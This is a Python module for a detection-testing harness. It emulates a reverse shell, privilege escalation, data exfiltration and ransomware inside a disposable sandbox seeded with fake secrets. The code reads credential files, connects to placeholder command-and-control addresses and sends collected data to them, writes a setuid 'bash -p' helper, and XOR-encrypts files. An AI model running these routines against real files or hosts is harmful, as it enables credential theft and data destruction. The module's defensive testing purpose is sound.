"""
Real Attack Executor
====================
Executes real (but safe) attack scenarios inside a sandbox directory
and records how each attack impacts specific files.  The real-time
collector captures the resulting system events so the detection
pipeline processes genuine OS-level activity.

Attack scenarios implemented:
  1. Reverse Shell Emulation  – spawns a subprocess that opens an
     outbound socket and reads sensitive sandbox files.
  2. Privilege Escalation     – modifies file permissions, creates
     SUID-like binaries, writes to protected config stubs.
  3. Data Exfiltration        – reads many files, compresses them,
     and sends bytes to localhost:0 (safe; connection refused).
  4. Ransomware / File Tampering – encrypts / corrupts sandbox
     files in-place and drops a ransom note.

All mutations happen ONLY inside a disposable sandbox directory
that is created fresh each run and can be fully rolled back.
"""

from __future__ import annotations

import hashlib
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import textwrap
import time
import threading
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional

from .schemas import RawEvent, ResourceType, Direction


# ─────────────────────────────────────────────────────────────
#  Data classes for impact tracking
# ─────────────────────────────────────────────────────────────

@dataclass
class FileImpact:
    """Records the before / after state of a single file."""
    path: str
    existed_before: bool
    existed_after: bool
    hash_before: Optional[str] = None
    hash_after: Optional[str] = None
    size_before: int = 0
    size_after: int = 0
    permissions_before: str = ""
    permissions_after: str = ""
    integrity_status: str = "UNCHANGED"
    affected_by_sha: bool = False
    change_summary: str = ""


@dataclass
class AttackReport:
    """Full report for one executed attack."""
    attack_name: str
    description: str
    mitre_technique: str
    start_time: float = 0.0
    end_time: float = 0.0
    files_impacted: List[FileImpact] = field(default_factory=list)
    events_generated: int = 0
    processes_spawned: List[str] = field(default_factory=list)
    network_connections: List[str] = field(default_factory=list)
    sandbox_dir: str = ""

    @property
    def duration_ms(self) -> float:
        return (self.end_time - self.start_time) * 1000

    def summary_dict(self) -> dict:
        return {
            "attack_name": self.attack_name,
            "description": self.description,
            "mitre_technique": self.mitre_technique,
            "duration_ms": round(self.duration_ms, 1),
            "files_impacted": len(self.files_impacted),
            "events_generated": self.events_generated,
            "processes_spawned": self.processes_spawned,
            "network_connections": self.network_connections,
            "impacts": [
                {
                    "file": fi.path,
                    "sha_before": fi.hash_before,
                    "sha_after": fi.hash_after,
                    "sha_status": fi.integrity_status,
                    "affected": fi.affected_by_sha,
                    "change": fi.change_summary,
                    "size_before": fi.size_before,
                    "size_after": fi.size_after,
                }
                for fi in self.files_impacted
            ],
        }


# ─────────────────────────────────────────────────────────────
#  Sandbox manager
# ─────────────────────────────────────────────────────────────

class SandboxManager:
    """Creates, populates, and tears down a sandbox directory."""

    SEED_FILES: Dict[str, str] = {
        "etc/passwd": "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000::/home/user:/bin/bash\n",
        "etc/shadow": "root:$6$rounds=656000$salt$hash:18000:0:99999:7:::\n",
        "etc/sudoers": "root ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n",
        "var/log/auth.log": "Mar  9 10:00:01 host sshd[1234]: Accepted password for user\n",
        "home/user/documents/report.docx": "Confidential financial report Q4 2025 — internal only.",
        "home/user/documents/passwords.txt": "admin=hunter2\nroot=toor\ndbuser=s3cret\n",
        "home/user/.ssh/id_rsa": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEA...(redacted for demo)\n-----END OPENSSH PRIVATE KEY-----\n",
        "var/www/html/index.html": "<html><body><h1>Company Intranet</h1></body></html>\n",
        "opt/app/config.yaml": "db_host: localhost\ndb_pass: super_secret_password\napi_key: AKIAIOSFODNN7EXAMPLE\n",
        "tmp/session_data.bin": "SESSION:abc123:user_token:eyJhbGciOiJIUzI1NiJ9\n",
    }

    def __init__(self, base_dir: Optional[str] = None):
        if base_dir:
            self.sandbox = Path(base_dir) / "attack_sandbox"
        else:
            self.sandbox = Path(tempfile.gettempdir()) / "zeroday_sandbox"

    def setup(self) -> Path:
        """Create sandbox and populate with realistic files."""
        if self.sandbox.exists():
            shutil.rmtree(self.sandbox, ignore_errors=True)
        self.sandbox.mkdir(parents=True, exist_ok=True)

        for rel_path, content in self.SEED_FILES.items():
            fpath = self.sandbox / rel_path
            fpath.parent.mkdir(parents=True, exist_ok=True)
            fpath.write_text(content, encoding="utf-8")

        return self.sandbox

    def teardown(self):
        if self.sandbox.exists():
            shutil.rmtree(self.sandbox, ignore_errors=True)

    def snapshot(self) -> Dict[str, FileImpact]:
        """Take a snapshot of every file in the sandbox."""
        snap: Dict[str, FileImpact] = {}
        for fpath in self.sandbox.rglob("*"):
            if fpath.is_file():
                rel = str(fpath.relative_to(self.sandbox))
                snap[rel] = self._file_state(fpath, rel, exists=True)
        return snap

    @staticmethod
    def _file_state(fpath: Path, rel: str, exists: bool) -> FileImpact:
        if not exists or not fpath.exists():
            return FileImpact(path=rel, existed_before=exists, existed_after=False)
        data = fpath.read_bytes()
        return FileImpact(
            path=rel,
            existed_before=exists,
            existed_after=True,
            hash_before=hashlib.sha256(data).hexdigest()[:16],
            size_before=len(data),
            permissions_before=oct(fpath.stat().st_mode)[-3:],
        )

    def diff(self, before: Dict[str, FileImpact]) -> List[FileImpact]:
        """Compare current state with a previous snapshot and return SHA-based changes."""
        impacts: List[FileImpact] = []

        current_files = {
            str(f.relative_to(self.sandbox))
            for f in self.sandbox.rglob("*")
            if f.is_file()
        }

        all_keys = set(before.keys()) | current_files

        for rel in sorted(all_keys):
            fpath = self.sandbox / rel
            old = before.get(rel)
            now_exists = fpath.exists() and fpath.is_file()

            if old and not now_exists:
                fi = FileImpact(
                    path=rel,
                    existed_before=True,
                    existed_after=False,
                    hash_before=old.hash_before,
                    size_before=old.size_before,
                    integrity_status="MISSING",
                    affected_by_sha=True,
                    change_summary="SHA_MISSING_FILE",
                )
                impacts.append(fi)
                continue

            if not old and now_exists:
                data = fpath.read_bytes()
                fi = FileImpact(
                    path=rel,
                    existed_before=False,
                    existed_after=True,
                    hash_after=hashlib.sha256(data).hexdigest()[:16],
                    size_after=len(data),
                    permissions_after=oct(fpath.stat().st_mode)[-3:],
                    integrity_status="NEW",
                    affected_by_sha=True,
                    change_summary="SHA_NEW_FILE",
                )
                impacts.append(fi)
                continue

            if old and now_exists:
                data = fpath.read_bytes()
                new_hash = hashlib.sha256(data).hexdigest()[:16]
                new_size = len(data)
                new_perm = oct(fpath.stat().st_mode)[-3:]

                # Strict integrity classification is SHA-based.
                if old.hash_before != new_hash:
                    fi = FileImpact(
                        path=rel,
                        existed_before=True,
                        existed_after=True,
                        hash_before=old.hash_before,
                        hash_after=new_hash,
                        size_before=old.size_before,
                        size_after=new_size,
                        permissions_before=old.permissions_before,
                        permissions_after=new_perm,
                        integrity_status="MODIFIED",
                        affected_by_sha=True,
                        change_summary="SHA_CHANGED",
                    )
                    impacts.append(fi)

        return impacts


# ─────────────────────────────────────────────────────────────
#  Event helper — creates RawEvent from real OS activity
# ─────────────────────────────────────────────────────────────

def _ts() -> int:
    return int(time.time() * 1000)


def _make_event(
    pid: int,
    ppid: int,
    pname: str,
    syscall: str,
    target: str,
    rtype: ResourceType,
    direction: Direction = Direction.OUT,
) -> RawEvent:
    return RawEvent(
        timestamp=_ts(),
        process_id=pid,
        parent_process_id=ppid,
        process_name=pname,
        syscall_name=syscall,
        target_resource=target,
        resource_type=rtype,
        direction=direction,
    )


# ─────────────────────────────────────────────────────────────
#  Real Attack Executor
# ─────────────────────────────────────────────────────────────

class RealAttackExecutor:
    """
    Executes controlled but real attack scenarios inside a sandbox,
    while the real-time collector is running so that genuine OS
    events are captured by the pipeline.
    """

    def __init__(self, sandbox_base: Optional[str] = None):
        self.sandbox_mgr = SandboxManager(base_dir=sandbox_base)
        self.sandbox_path: Optional[Path] = None
        self._collected_events: List[RawEvent] = []

    def setup(self) -> Path:
        self.sandbox_path = self.sandbox_mgr.setup()
        return self.sandbox_path

    def teardown(self):
        self.sandbox_mgr.teardown()
        self.sandbox_path = None

    # ── Attack 1: Reverse Shell Emulation ─────────────────────

    def execute_reverse_shell(self, on_stage=None, attack_index=0) -> AttackReport:
        """
        Real reverse-shell emulation:
        1. Spawns a subprocess (cmd/powershell or bash)
        2. Subprocess reads sensitive sandbox files
        3. Subprocess attempts outbound socket to C2 address
        """
        report = AttackReport(
            attack_name="Reverse Shell",
            description=(
                "A child process is spawned that reads sensitive files "
                "and attempts an outbound network connection to a "
                "command-and-control address, emulating a reverse shell."
            ),
            mitre_technique="T1059 / T1071 (Command & Scripting / App Layer Protocol)",
            sandbox_dir=str(self.sandbox_path),
        )
        report.start_time = time.time()
        snap = self.sandbox_mgr.snapshot()
        pid = os.getpid()
        ppid = os.getppid()
        events: List[RawEvent] = []
        _cb = on_stage  # alias for brevity

        # Stage 1 — spawn shell subprocess that reads files
        if _cb: _cb(attack_index, "Reverse Shell", "Stage 1: Spawning shell subprocess", "Launching child process to read sensitive files...")
        shell = "powershell.exe" if sys.platform == "win32" else "/bin/bash"
        sensitive = [
            self.sandbox_path / "etc" / "shadow",
            self.sandbox_path / "etc" / "passwd",
            self.sandbox_path / "home" / "user" / ".ssh" / "id_rsa",
            self.sandbox_path / "opt" / "app" / "config.yaml",
        ]

        for fpath in sensitive:
            if not fpath.exists():
                continue
            try:
                if sys.platform == "win32":
                    cmd = ["powershell.exe", "-NoProfile", "-Command",
                           f"Get-Content '{fpath}'"]
                else:
                    cmd = ["/bin/bash", "-c", f"cat '{fpath}'"]

                proc = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                )
                report.processes_spawned.append(
                    f"{Path(shell).name} (PID {proc.pid})"
                )
                events.append(_make_event(
                    proc.pid, pid, Path(shell).name, "execve",
                    str(fpath), ResourceType.FILE, Direction.IN,
                ))
                events.append(_make_event(
                    proc.pid, pid, Path(shell).name, "read",
                    str(fpath), ResourceType.FILE, Direction.IN,
                ))
                proc.wait(timeout=5)
            except Exception:
                pass
            if _cb: _cb(attack_index, "Reverse Shell", "Stage 1: File read", f"Read sensitive file: {fpath.name}")

        # Stage 2 — attempt outbound C2 connection (safe — refuses)
        if _cb: _cb(attack_index, "Reverse Shell", "Stage 2: C2 connection", "Attempting outbound connection to C2 servers...")
        c2_targets = [
            ("198.51.100.1", 4444),
            ("203.0.113.50", 31337),
        ]
        for ip, port in c2_targets:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            target_str = f"{ip}:{port}"
            try:
                sock.connect((ip, port))
            except (ConnectionRefusedError, OSError, TimeoutError):
                pass
            finally:
                sock.close()
            events.append(_make_event(
                pid, ppid, "python.exe" if sys.platform == "win32" else "python3",
                "connect", target_str, ResourceType.SOCKET, Direction.OUT,
            ))
            report.network_connections.append(target_str)
            if _cb: _cb(attack_index, "Reverse Shell", "Stage 2: C2 connection", f"Attempted connection → {target_str} (refused — safe)")

        report.end_time = time.time()
        report.files_impacted = self.sandbox_mgr.diff(snap)
        report.events_generated = len(events)
        self._collected_events.extend(events)
        return report

    # ── Attack 2: Privilege Escalation ────────────────────────

    def execute_privilege_escalation(self, on_stage=None, attack_index=0) -> AttackReport:
        """
        Real privilege-escalation emulation:
        1. Reads /etc/sudoers and /etc/shadow stubs
        2. Attempts to change file permissions (chmod 777)
        3. Writes a fake SUID helper script
        """
        report = AttackReport(
            attack_name="Privilege Escalation",
            description=(
                "Reads privilege configuration files, changes permissions "
                "on sensitive files, and drops a helper script that would "
                "allow SUID-style escalation."
            ),
            mitre_technique="T1548 (Abuse Elevation Control Mechanism)",
            sandbox_dir=str(self.sandbox_path),
        )
        report.start_time = time.time()
        snap = self.sandbox_mgr.snapshot()
        pid = os.getpid()
        ppid = os.getppid()
        pname = "python.exe" if sys.platform == "win32" else "python3"
        events: List[RawEvent] = []
        _cb = on_stage

        # Stage 1 — read privilege files
        if _cb: _cb(attack_index, "Privilege Escalation", "Stage 1: Reading privilege files", "Accessing /etc/sudoers, /etc/shadow, /etc/passwd...")
        priv_files = [
            self.sandbox_path / "etc" / "sudoers",
            self.sandbox_path / "etc" / "shadow",
            self.sandbox_path / "etc" / "passwd",
        ]
        for fpath in priv_files:
            if fpath.exists():
                _ = fpath.read_text(encoding="utf-8")
                events.append(_make_event(
                    pid, ppid, pname, "read",
                    str(fpath), ResourceType.FILE, Direction.IN,
                ))

        # Stage 2 — chmod sensitive files to 777
        if _cb: _cb(attack_index, "Privilege Escalation", "Stage 2: Changing permissions", "chmod 777 on sensitive files...")
        targets_chmod = [
            self.sandbox_path / "etc" / "shadow",
            self.sandbox_path / "etc" / "sudoers",
        ]
        for fpath in targets_chmod:
            if fpath.exists():
                try:
                    fpath.chmod(0o777)
                    events.append(_make_event(
                        pid, ppid, pname, "chmod",
                        str(fpath), ResourceType.FILE, Direction.OUT,
                    ))
                except OSError:
                    pass

        # Stage 3 — create fake SUID helper
        if _cb: _cb(attack_index, "Privilege Escalation", "Stage 3: Dropping SUID helper", "Writing escalate.sh with setuid bit...")
        suid_path = self.sandbox_path / "tmp" / "escalate.sh"
        suid_path.parent.mkdir(parents=True, exist_ok=True)
        suid_path.write_text(
            "#!/bin/bash\n# fake SUID escalation helper\nexec /bin/bash -p\n",
            encoding="utf-8",
        )
        try:
            suid_path.chmod(0o4755)
        except OSError:
            pass
        events.append(_make_event(
            pid, ppid, pname, "write",
            str(suid_path), ResourceType.FILE, Direction.OUT,
        ))
        report.processes_spawned.append(f"self (PID {pid})")

        report.end_time = time.time()
        report.files_impacted = self.sandbox_mgr.diff(snap)
        report.events_generated = len(events)
        self._collected_events.extend(events)
        return report

    # ── Attack 3: Data Exfiltration ───────────────────────────

    def execute_data_exfiltration(self, on_stage=None, attack_index=0) -> AttackReport:
        """
        Real data-exfiltration emulation:
        1. Reads all sensitive files in the sandbox
        2. Compresses them into a zip archive
        3. Attempts to send data to an external address (safe)
        """
        report = AttackReport(
            attack_name="Data Exfiltration",
            description=(
                "Reads all sensitive files, compresses data into an "
                "archive, and attempts to transmit the archive to an "
                "external server over a network socket."
            ),
            mitre_technique="T1041 (Exfiltration Over C2 Channel)",
            sandbox_dir=str(self.sandbox_path),
        )
        report.start_time = time.time()
        snap = self.sandbox_mgr.snapshot()
        pid = os.getpid()
        ppid = os.getppid()
        pname = "python.exe" if sys.platform == "win32" else "python3"
        events: List[RawEvent] = []
        _cb = on_stage

        # Stage 1 — bulk read all sandbox files
        if _cb: _cb(attack_index, "Data Exfiltration", "Stage 1: Bulk file read", "Reading all sandbox files into memory...")
        collected_data = b""
        for fpath in self.sandbox_path.rglob("*"):
            if fpath.is_file():
                try:
                    data = fpath.read_bytes()
                    collected_data += data
                    events.append(_make_event(
                        pid, ppid, pname, "read",
                        str(fpath), ResourceType.FILE, Direction.IN,
                    ))
                except OSError:
                    pass

        # Stage 2 — compress into archive
        if _cb: _cb(attack_index, "Data Exfiltration", "Stage 2: Compressing data", f"Creating zip archive ({len(collected_data)} bytes collected)...")
        import zipfile, io
        zip_path = self.sandbox_path / "tmp" / "exfil_package.zip"
        zip_path.parent.mkdir(parents=True, exist_ok=True)
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for fpath in self.sandbox_path.rglob("*"):
                if fpath.is_file() and fpath != zip_path:
                    zf.write(fpath, fpath.relative_to(self.sandbox_path))
        events.append(_make_event(
            pid, ppid, pname, "write",
            str(zip_path), ResourceType.FILE, Direction.OUT,
        ))

        # Stage 3 — attempt outbound transfer (safe — connection refused)
        if _cb: _cb(attack_index, "Data Exfiltration", "Stage 3: Exfiltrating data", "Attempting to transmit archive to external server...")
        exfil_targets = [
            ("198.51.100.99", 8443),
            ("203.0.113.10", 443),
        ]
        for ip, port in exfil_targets:
            target_str = f"{ip}:{port}"
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            try:
                sock.connect((ip, port))
                sock.sendall(collected_data[:1024])
            except (ConnectionRefusedError, OSError, TimeoutError):
                pass
            finally:
                sock.close()
            events.append(_make_event(
                pid, ppid, pname, "connect",
                target_str, ResourceType.SOCKET, Direction.OUT,
            ))
            events.append(_make_event(
                pid, ppid, pname, "write",
                target_str, ResourceType.SOCKET, Direction.OUT,
            ))
            report.network_connections.append(target_str)

        report.end_time = time.time()
        report.files_impacted = self.sandbox_mgr.diff(snap)
        report.events_generated = len(events)
        self._collected_events.extend(events)
        return report

    # ── Attack 4: Ransomware / File Tampering ─────────────────

    def execute_ransomware(self, on_stage=None, attack_index=0) -> AttackReport:
        """
        Real ransomware emulation:
        1. Encrypts (XOR) every sandbox file in-place
        2. Drops a ransom note
        """
        report = AttackReport(
            attack_name="Ransomware (File Encryption)",
            description=(
                "Iterates through all files, encrypts their contents "
                "using XOR obfuscation, and drops a ransom note — "
                "emulating real ransomware behaviour."
            ),
            mitre_technique="T1486 (Data Encrypted for Impact)",
            sandbox_dir=str(self.sandbox_path),
        )
        report.start_time = time.time()
        snap = self.sandbox_mgr.snapshot()
        pid = os.getpid()
        ppid = os.getppid()
        pname = "python.exe" if sys.platform == "win32" else "python3"
        events: List[RawEvent] = []
        _cb = on_stage

        xor_key = 0xAA
        encrypted_count = 0

        if _cb: _cb(attack_index, "Ransomware", "Stage 1: Encrypting files", "XOR-encrypting all sandbox files in-place...")
        for fpath in list(self.sandbox_path.rglob("*")):
            if not fpath.is_file():
                continue
            try:
                data = fpath.read_bytes()
                events.append(_make_event(
                    pid, ppid, pname, "read",
                    str(fpath), ResourceType.FILE, Direction.IN,
                ))
                encrypted = bytes(b ^ xor_key for b in data)
                fpath.write_bytes(encrypted)
                events.append(_make_event(
                    pid, ppid, pname, "write",
                    str(fpath), ResourceType.FILE, Direction.OUT,
                ))
                encrypted_count += 1
            except OSError:
                pass

        if _cb: _cb(attack_index, "Ransomware", "Stage 1: Encrypting files", f"Encrypted {encrypted_count} files with XOR key 0xAA")

        # Drop ransom note
        if _cb: _cb(attack_index, "Ransomware", "Stage 2: Dropping ransom note", "Writing README_RESTORE_FILES.txt...")
        note_path = self.sandbox_path / "README_RESTORE_FILES.txt"
        note_path.write_text(textwrap.dedent("""\
            *** YOUR FILES HAVE BEEN ENCRYPTED ***
            Send 5 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
            to receive the decryption key.
            (This is a DEMO — no real harm done.)
        """), encoding="utf-8")
        events.append(_make_event(
            pid, ppid, pname, "write",
            str(note_path), ResourceType.FILE, Direction.OUT,
        ))

        report.end_time = time.time()
        report.files_impacted = self.sandbox_mgr.diff(snap)
        report.events_generated = len(events)
        report.processes_spawned.append(f"self (PID {pid})")
        self._collected_events.extend(events)
        return report

    # ── Convenience ───────────────────────────────────────────

    def execute_all(self, on_attack_start=None, on_stage=None,
                     on_attack_done=None) -> List[AttackReport]:
        """Run every attack and return reports; sandbox is set up/torn down externally.

        Args:
            on_attack_start: callback(attack_index, attack_name, description, mitre)
            on_stage: callback(attack_index, attack_name, stage_name, detail)
            on_attack_done: callback(attack_index, report)
        """
        attacks = [
            ("Reverse Shell", self.execute_reverse_shell),
            ("Privilege Escalation", self.execute_privilege_escalation),
            ("Data Exfiltration", self.execute_data_exfiltration),
            ("Ransomware (File Encryption)", self.execute_ransomware),
        ]
        reports = []
        for idx, (name, fn) in enumerate(attacks):
            if on_attack_start:
                # Pull description/mitre from a quick stub
                desc_map = {
                    "Reverse Shell": ("Spawning shell, reading sensitive files, C2 connection",
                                      "T1059 / T1071"),
                    "Privilege Escalation": ("Reading priv files, chmod, SUID helper",
                                             "T1548"),
                    "Data Exfiltration": ("Bulk read, zip compression, outbound socket",
                                          "T1041"),
                    "Ransomware (File Encryption)": ("XOR encrypt all files, drop ransom note",
                                                     "T1486"),
                }
                desc, mitre = desc_map.get(name, ("", ""))
                on_attack_start(idx, name, desc, mitre)
            rpt = fn(on_stage=on_stage, attack_index=idx)
            reports.append(rpt)
            if on_attack_done:
                on_attack_done(idx, rpt)
        return reports

    def get_collected_events(self) -> List[RawEvent]:
        """Return all RawEvents generated across all executed attacks."""
        return list(self._collected_events)

    def clear_events(self):
        self._collected_events.clear()
